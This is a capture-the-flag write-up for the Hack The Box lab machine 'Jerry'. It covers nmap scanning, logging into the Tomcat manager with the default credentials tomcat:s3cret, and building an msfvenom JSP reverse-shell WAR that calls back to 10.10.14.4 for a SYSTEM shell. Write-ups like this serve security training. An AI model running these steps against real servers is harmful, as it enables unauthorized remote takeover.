# Jerry

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.95]
└─# nmap -p- --min-rate 5000 -Pn 10.10.10.95 -oN all_ports.nmap      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 09:42 EDT
Nmap scan report for 10.10.10.95
Host is up (0.17s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 26.56 seconds
```

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.95]
└─# nmap -p 8080 -A --min-rate 5000 -Pn 10.10.10.95 -oN aggr.nmap  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 09:43 EDT
Nmap scan report for 10.10.10.95
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   173.35 ms 10.10.14.1
2   173.64 ms 10.10.10.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.69 seconds

```

Seems like there's only one open port (8080).

### Tomcat Default Creds

Heading to http://10.10.10.95:8080,

<figure><img src="../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

Using the creds: admin:admin,

* we got `403 Access Denied`

<figure><img src="../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

However, using default Tomcat Manager Console creds (tomcat:s3cret),

* I managed to login to the Application Manager Console

<figure><img src="../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

Generate a WAR reverse shell,

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.95]
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f war -o revshell.war
Payload size: 1103 bytes
Final size of war file: 1103 bytes
Saved as: revshell.war
```

Uploading the reverse shell,

<figure><img src="../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

Browse the Reverse shell at [http://10.10.10.95:8080/revshell/](http://10.10.10.95:8080/revshell/)

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.95]
└─# nc -lvp 443
listening on [any] 443 ...
10.10.10.95: inverse host lookup failed: Unknown host
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```
